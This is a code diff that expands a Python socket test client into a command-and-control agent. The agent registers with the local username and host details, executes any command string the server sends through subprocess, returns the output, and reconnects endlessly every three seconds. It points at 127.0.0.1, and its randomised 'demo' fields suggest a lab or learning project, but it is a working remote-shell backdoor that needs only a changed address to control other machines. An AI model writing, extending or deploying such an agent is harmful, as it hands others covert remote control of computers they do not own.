@@ -1,55 +1,146 @@
 import socket
 import json
+import uuid
+import time
+import platform
+import getpass
+import subprocess
+import random
 
 
+SERVER_IP = "127.0.0.1"
+SERVER_PORT = 4926
+RECONNECT_DELAY = 3
+
+
+# ========================
+# Utils
+# ========================
 def recv_full(sock, n):
     data = b''
     while len(data) < n:
-        chunk = sock.recv(n - len(data))
-        if not chunk:
+        try:
+            chunk = sock.recv(n - len(data))
+            if not chunk:
+                return None
+            data += chunk
+        except:
             return None
-        data += chunk
     return data
 
 
-if __name__ == '__main__':
-    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    client.connect(('127.0.0.1', 4926))
+def send_packet(sock, data_dict):
+    try:
+        payload = json.dumps(data_dict).encode()
+        length = len(payload).to_bytes(4, byteorder='big')
+        sock.sendall(length + payload)
+    except:
+        return False
+    return True
 
-    data = {
-        'header': 'register',
-        'data': {
-            'uuid': '1234',
-            'hostname': 'test-host',
-            'username': 'ahihi',
-            'os': 'Windows',
-            'os_version': '11',
-            'arch': 'x64'
-        }
+
+# ========================
+# System Info
+# ========================
+
+def collect_info():
+    return {
+        'uuid': str(uuid.uuid4()),
+        'hostname': f"client-{random.randint(1000,9999)}",
+        'username': getpass.getuser(),
+        'os': random.choice(["Windows", "Ubuntu", "Kali"]),
+        'os_version': "demo",
+        'arch': platform.machine()
     }
 
-    payload = json.dumps(data).encode()
-    length = len(payload).to_bytes(4, byteorder='big')
-    client.sendall(length + payload)
 
+# ========================
+# Command Execution
+# ========================
+def execute_command(cmd):
+    try:
+        result = subprocess.getoutput(cmd)
+        return result
+    except Exception as e:
+        return f"Error: {e}"
+
+
+# ========================
+# Main Agent Loop
+# ========================
+def run_agent():
     while True:
-        raw_len = recv_full(client, 4)
-        if not raw_len:
-            print("Server disconnected")
-            break
+        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        client.settimeout(10)
 
-        msg_len = int.from_bytes(raw_len, byteorder='big')
+        try:
+            print("[*] Connecting to server...")
+            client.connect((SERVER_IP, SERVER_PORT))
+            print("[+] Connected")
 
-        payload = recv_full(client, msg_len)
-        if not payload:
-            print("Server disconnected")
-            break
+            # Register
+            info = collect_info()
+            register_packet = {
+                'type': 'register',
+                'data': info
+            }
 
-        msg = json.loads(payload.decode())
-        print("Received:", msg)
+            send_packet(client, register_packet)
 
-        if msg.get('header') == 'command' and msg.get('data') == 'agent.exit':
-            print("Exit received")
-            break
+            # Main loop
+            while True:
+                raw_len = recv_full(client, 4)
+                if not raw_len:
+                    print("[!] Server disconnected")
+                    break
 
-    client.close()
+                msg_len = int.from_bytes(raw_len, 'big')
+
+                payload = recv_full(client, msg_len)
+                if not payload:
+                    print("[!] Server disconnected")
+                    break
+
+                try:
+                    msg = json.loads(payload.decode())
+                except:
+                    continue
+
+                header = msg.get('header')
+                data = msg.get('data')
+
+                print(f"[DEBUG] Received: {header} -> {data}")
+
+                # ========================
+                # Handle commands
+                # ========================
+                if header == 'command':
+
+                    if data == 'agent.exit':
+                        print("[*] Exit command received")
+                        return
+
+                    # Execute shell command
+                    output = execute_command(data)
+
+                    response = {
+                        'header': 'result',
+                        'data': output
+                    }
+
+                    send_packet(client, response)
+
+        except Exception as e:
+            print(f"[!] Connection error: {e}")
+
+        finally:
+            client.close()
+            print(f"[*] Reconnecting in {RECONNECT_DELAY}s...\n")
+            time.sleep(RECONNECT_DELAY)
+
+
+# ========================
+# Entry
+# ========================
+if __name__ == "__main__":
+    run_agent()
